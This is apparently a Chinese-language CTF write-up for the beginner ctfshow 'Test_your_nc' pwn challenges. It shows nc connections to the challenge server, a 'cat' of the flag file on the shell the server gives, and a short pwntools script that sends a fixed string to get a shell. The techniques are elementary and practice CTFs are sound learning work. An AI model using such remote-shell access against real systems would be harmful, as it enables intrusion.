---
title: 'Test_your_nc'
date: 2026-03-27 14:52:40 +0800
categories:
  - ctf刷题
  - pwn刷题
tags:
  - ctfshow
  - Test_your_nc
---
## Test_your_nc

我认为，我从不缺从头再来的勇气





### pwn0

ssh登录





### pwn1

其他函数都很简单易懂，前两个初始函数的作用是关闭标准输出（`stdout`/`_bss_start`）和标准输入（`stdin`）的缓冲区，保障实时交互

```c
setvbuf(_bss_start, 0LL, 2, 0LL);
setvbuf(stdin, 0LL, 2, 0LL);
```

![image-20260327101105176](/assets/img/posts/test-your-nc/image-20260327101105176.png)

```bash
nc pwn.challenge.ctf.show 28160
```





### pwn2

简单易懂，直接把shell给我了

![image-20260327101506862](/assets/img/posts/test-your-nc/image-20260327101506862.png)

```bash
nc pwn.challenge.ctf.show 28309
cat /ctfshow_flag
```





### pwn3

简单提一下，puts() 和 printf() 是有区别的，其中 printf() 支持格式化字符串，

![image-20260327101828783](/assets/img/posts/test-your-nc/image-20260327101828783.png)

```bash
nc pwn.challenge.ctf.show 28107
4/6		# 这两个函数都是读flag
```





### pwn4

逻辑很简单，给了两个字符串 s1 和 s2，一个赋值为 CTFshowPWN ，一个通过输入赋值，如果两者的值一致，就返回 shell

![image-20260327105247424](/assets/img/posts/test-your-nc/image-20260327105247424.png)

编写我的第一个 exploit.py

```python
from pwn import *

# 1.启动进程
io = remote('pwn.challenge.ctf.show', 28174)

# 2.等待程序运行到交互
io.recvuntil(b"find the secret !")

# 3.发送 payload
payload =  b"CTFshowPWN"
io.sendline(payload)	# sendline 函数是自带回车的

# 4.保持交互
io.interactive()
```





